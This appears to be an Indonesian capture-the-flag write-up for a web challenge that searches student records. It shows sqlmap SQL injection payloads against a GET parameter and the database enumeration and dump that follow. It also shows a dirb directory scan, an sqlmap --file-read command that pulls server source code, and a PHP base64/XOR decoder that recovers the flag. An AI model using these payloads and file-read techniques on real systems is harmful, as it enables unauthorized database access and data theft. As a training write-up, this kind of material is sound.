Sebuah website yang mengizinkan kita untuk mencari data nama mahasiswa.

Link : http://103.157.96.13:7792/

```
---
Parameter: mahasiswa (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: mahasiswa=877521' OR NOT 1790=1790#

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: mahasiswa=877521' AND GTID_SUBSET(CONCAT(0x717a787871,(SELECT (ELT(2889=2889,1))),0x717a626b71),2889)-- DDTy

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: mahasiswa=877521';SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: mahasiswa=877521' AND (SELECT 9427 FROM (SELECT(SLEEP(5)))vxEg)-- lAts

    Type: UNION query
    Title: MySQL UNION query (NULL) - 2 columns
    Payload: mahasiswa=877521' UNION ALL SELECT NULL,CONCAT(0x717a787871,0x664b564b787061534f644d4c44555a77496d766a646c47724e504a5464495667716e614446437a62,0x717a626b71)#
---
```

Database
```
[*] ctfr_mahasiswa
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
```

Tables
```
Database: ctfr_mahasiswa
[2 tables]
+---------------+
| key_mahasiswa |
| mahasiswa     |
+---------------+
```

Columns
```
Database: ctfr_mahasiswa
Table: key_mahasiswa
[1 column]
+--------+------------+
| Column | Type       |
+--------+------------+
| key    | mediumtext |
+--------+------------+
```

Data
```
Vm1wSk1XRXhaSFJXYmtwcVUwWktjMVZ0TlVOV1JteFdWbTVPVkZac2NFaFpWVnByVlRKS1IxZHNUbGRXZWtaTVZtdGFZVk5XY0VaTlZuQnBVbGhDV1ZadGRGZFZiVlpIVW01S1ZHSkhVbFZWYkZKWFdWWmFkR1JGWkZkTmExcEhXbFZTVTFadFNuTlhiRnBXVFVad1RGZFdXbXRXVmtwWldrWldVMkV4YkRaV1ZFWlRWakZzVjFOdVZtRmxiRnBXVm1wT1UyTnNXbFpXVkZaT1RWWmFlbGRyVms5aFZrcFhWMnBHV0dFeWFIRlVWVnBEVld4Q1ZVMUVNRDA9

WlZvTkUyQmtkeGM4WUU5RGJHSlhWajFVV0JocE1YRkNhbUpRRFRodUt3bC9jVnBCV0dKeFhUdzVmRmxUQzJKRktuRThSV3cwWFVKVFlpY0VhSDR6UVd0aE4xSnJKakJCUDFOeVFYNTNmeFpxY1NkUWRsdzNEZz09

ZwVYCGBkd1U/YH1bVEwhWj5uXA15Kl9eUlgCAwNuIxRvZXRZW3Z1WgQPWll5InpZAFsgXWw0f19/cgUZU34CSVN9KFp8UwFOBCV6W3oCXhlRcixY

VmpGU1MxSnNTbkpsUm1oc1VqQndWMVpyWkU5Tk1WbzJWR3RrYW1KSGVFbFdSbWhEWVVaYVJsZHNaRmRXVmtwRVdXdFdVMlJXV25SbFJ6RlhUVVJXVkZVd1drNU9WWGQzVjIwNWFWSkhVbGxYYWtaelVteHNkR1JFUWs1aE1IQkdWR3RTVDFVeFdsaGtNMHBVVm0xb2FGbFVRalJrUms1WlZHeGFhVlpYZUdoWFZsSkxXVmRHUmxOclpGUldNRnBvVkZod1FtVnNXbkZVVkZacllURndWMXBWWkRCVE1WcEhVMnhLVkUxR1NuSlVWbHBUVTBVNVdFMVhlRk5oZWxZeVZqRldTMUl4VVhsVGEyeFZWa1ZLV0ZwWGVFdFZWbXQ1WlVaS2JGSXhjRnBhUkVKUFZFVXhkV0ZFVGxKaE1tUXpWbFZhUzA1R1JuRmhSVkpPVFZWYVZGWkZhSE5SYkZKV1ZsaHdiRkl5ZUVkV1ZtUlBaVVpXV1dKRlpGTmlWbkJJV1d0V1lWSkdaRWRXV0doVlVsVndSRlJyWkZOU01WcFhWRzEwVTAxRVVUQlZiR2h6VFVkV2RGUnVTbEpoYkZweFZsUkdkMU5zVFhsT1dGcFZWbGRTTVZwRVNYaFhiVVYzVTFSV1dGWnJOWFZXVjNRMFYxVXhSVkZyYUZoVFJVcDBWV3RTVDFFd01WaFZiR2hVWVhwR1RWbFZaR3RTUmtaWFlVUk9hRkl4U2xkV1JtaFRZVEZXY1ZacVNtRldhM0F5VmtkNFMxTlhSa2xoUlhSc1UwVkZNRmRzWkc5VE1WSklWMWhvVW1KV1drUldha0pIVjJ4S1YxWnFUbWxOUlRWRFdrUkNWMkpGTVZobFJVNVZZVEprTkZsV1ZucGtNVXB4VkcxMFVtRXhjRTVXUldRMFRURldSMWRyVW1oU1IzaHhWRlpWZUdWV2JGbFpNMmhTWWxad1ZWVXlNVzlTYkU1SldrVXhZVkpWY0RaYVJWWjJaVlphV0ZadE1WZFhSVFI1VlZjMWMyUXhWbFpXV0dSb1VrZDRWVmx0TlU5VE1XeFhVMjAxVmsxSGFERmFSV1JYVjBaYWNsZHFTbGhTTTFKTFYydFdNRkl3TlVkUmEwcE9UVzVuTUZVeU1UQmliVWw0VW10YVZWWXdXblJXVm1oUFZGWldjMW96YUdoU1dGSkVWVEZvWVdGSFJrWmlSMFpoVmtWYVIxWkZWazlWYkVKVlRVUXdQUT09
```
Sepertinya Enkripsi, harus explore, pake dirb
```
dirb http://103.157.96.13:7792/ -X .php 
http://103.157.96.13:7792/enc.php                                                     http://103.157.96.13:7792/index.php
```

Command
```
sqlmap -u "http://103.157.96.13:7792/?mahasiswa=877521" --file-read="/var/www/html/enc.php"
```

Code
```
<?php
class Encrypt {
	private static $key = "7aa975ee77355c1d94b0b3605ada9ea66649134fa610e05c6f65c9765bc29e329f51af4ea44709c06b797f3c57dd992f8541f0f0a1bac4f11f7f9d010298aef6";
	
	public static function Decrypt($txt) {
		$res = $txt;
		while(true) {
			$res = base64_decode($res);
			if (self::is_base64($res) !== false) {
				continue;
			} else break;
		}
		
		$dec = '';
		for($i = 0; $i < strlen($res); $i++)
		{
			$dec .= chr(ord($res[$i]) ^ ord(self::$key[$i % strlen(self::$key) - 1]));
		}
		
		return base64_decode($dec);
	}
	
	static function is_base64($s)
	{
		  return (bool) preg_match('/^[a-zA-Z0-9\/\r\n+]*={0,2}$/', $s);
	}
}

$arr=[
"Vm1wSk1XRXhaSFJXYmtwcVUwWktjMVZ0TlVOV1JteFdWbTVPVkZac2NFaFpWVnByVlRKS1IxZHNUbGRXZWtaTVZtdGFZVk5XY0VaTlZuQnBVbGhDV1ZadGRGZFZiVlpIVW01S1ZHSkhVbFZWYkZKWFdWWmFkR1JGWkZkTmExcEhXbFZTVTFadFNuTlhiRnBXVFVad1RGZFdXbXRXVmtwWldrWldVMkV4YkRaV1ZFWlRWakZzVjFOdVZtRmxiRnBXVm1wT1UyTnNXbFpXVkZaT1RWWmFlbGRyVms5aFZrcFhWMnBHV0dFeWFIRlVWVnBEVld4Q1ZVMUVNRDA9",

"WlZvTkUyQmtkeGM4WUU5RGJHSlhWajFVV0JocE1YRkNhbUpRRFRodUt3bC9jVnBCV0dKeFhUdzVmRmxUQzJKRktuRThSV3cwWFVKVFlpY0VhSDR6UVd0aE4xSnJKakJCUDFOeVFYNTNmeFpxY1NkUWRsdzNEZz09",

"ZwVYCGBkd1U/YH1bVEwhWj5uXA15Kl9eUlgCAwNuIxRvZXRZW3Z1WgQPWll5InpZAFsgXWw0f19/cgUZU34CSVN9KFp8UwFOBCV6W3oCXhlRcixY",

"VmpGU1MxSnNTbkpsUm1oc1VqQndWMVpyWkU5Tk1WbzJWR3RrYW1KSGVFbFdSbWhEWVVaYVJsZHNaRmRXVmtwRVdXdFdVMlJXV25SbFJ6RlhUVVJXVkZVd1drNU9WWGQzVjIwNWFWSkhVbGxYYWtaelVteHNkR1JFUWs1aE1IQkdWR3RTVDFVeFdsaGtNMHBVVm0xb2FGbFVRalJrUms1WlZHeGFhVlpYZUdoWFZsSkxXVmRHUmxOclpGUldNRnBvVkZod1FtVnNXbkZVVkZacllURndWMXBWWkRCVE1WcEhVMnhLVkUxR1NuSlVWbHBUVTBVNVdFMVhlRk5oZWxZeVZqRldTMUl4VVhsVGEyeFZWa1ZLV0ZwWGVFdFZWbXQ1WlVaS2JGSXhjRnBhUkVKUFZFVXhkV0ZFVGxKaE1tUXpWbFZhUzA1R1JuRmhSVkpPVFZWYVZGWkZhSE5SYkZKV1ZsaHdiRkl5ZUVkV1ZtUlBaVVpXV1dKRlpGTmlWbkJJV1d0V1lWSkdaRWRXV0doVlVsVndSRlJyWkZOU01WcFhWRzEwVTAxRVVUQlZiR2h6VFVkV2RGUnVTbEpoYkZweFZsUkdkMU5zVFhsT1dGcFZWbGRTTVZwRVNYaFhiVVYzVTFSV1dGWnJOWFZXVjNRMFYxVXhSVkZyYUZoVFJVcDBWV3RTVDFFd01WaFZiR2hVWVhwR1RWbFZaR3RTUmtaWFlVUk9hRkl4U2xkV1JtaFRZVEZXY1ZacVNtRldhM0F5VmtkNFMxTlhSa2xoUlhSc1UwVkZNRmRzWkc5VE1WSklWMWhvVW1KV1drUldha0pIVjJ4S1YxWnFUbWxOUlRWRFdrUkNWMkpGTVZobFJVNVZZVEprTkZsV1ZucGtNVXB4VkcxMFVtRXhjRTVXUldRMFRURldSMWRyVW1oU1IzaHhWRlpWZUdWV2JGbFpNMmhTWWxad1ZWVXlNVzlTYkU1SldrVXhZVkpWY0RaYVJWWjJaVlphV0ZadE1WZFhSVFI1VlZjMWMyUXhWbFpXV0dSb1VrZDRWVmx0TlU5VE1XeFhVMjAxVmsxSGFERmFSV1JYVjBaYWNsZHFTbGhTTTFKTFYydFdNRkl3TlVkUmEwcE9UVzVuTUZVeU1UQmliVWw0VW10YVZWWXdXblJXVm1oUFZGWldjMW96YUdoU1dGSkVWVEZvWVdGSFJrWmlSMFpoVmtWYVIxWkZWazlWYkVKVlRVUXdQUT09"
];

foreach($arr as $r){
	$dec = Encrypt::Decrypt($r);
	var_dump($dec);
}
?>
```

```
string(42) "CTFR{0o0ow_1_f0rg0t_turn_0ff_0utf1l3_m4t3}"
string(65) "Jika kalian bisa membaca ini berarti flagnya dekat dengan anda :D"
string(63) "Coba tebak dehh yang mana flagnya beradaaa h3hh3h3h3h3h3h3h3h3h"
string(217) "QWKRWQRQWQRWRWQRQR1]24[12]4[14][141P12][4P[]2P4]1[2P4]1P1]P4][2P4][14P14114.,/.1,4/.1,4/1.2,412/4.,12/41,,124/1,4/12.,41./C,41/.4,1/4,X/.,4124,12/4C,12/4.,V12/4,12/4,2Z1/.,4/.12,41/24.,1/24C,12/4V,12/4,12/,12/,12/5,12"
```

Flag 
```
CTFR{0o0ow_1_f0rg0t_turn_0ff_0utf1l3_m4t3}
```
